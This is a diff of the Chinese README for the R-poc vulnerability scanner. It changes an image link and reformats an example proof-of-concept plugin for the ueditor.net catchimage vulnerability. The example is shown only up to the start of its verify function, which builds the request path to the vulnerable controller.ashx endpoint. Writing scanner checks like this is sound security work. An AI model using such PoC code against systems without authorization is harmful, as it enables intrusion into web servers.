@@ -16,22 +16,18 @@ vulscan.py http://www.xxx.com
 
 vulscan.py target.txt(目标文件放置于target目录下)
 
-![R-poc1](C:\Users\Administrator\Desktop\R-poc1.png)
+![](https://github.com/hackerhackrat/R-poc/blob/main/img/R-poc1.png)
 
 # 如何编写poc？
 
 一下为ueditor.net漏洞的poc
 
 `#!/usr/bin/env python
-
 #coding=utf-8
-
 import requests
 from report.report import save
-
 pocname = "ueditor-net"
 headers = {'Content-Type': 'application/x-www-form-urlencoded','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}
-
 def verify(arg, **kwargs):
 	exploit = "/ueditor/net/controller.ashx?action=catchimage"
 	try:
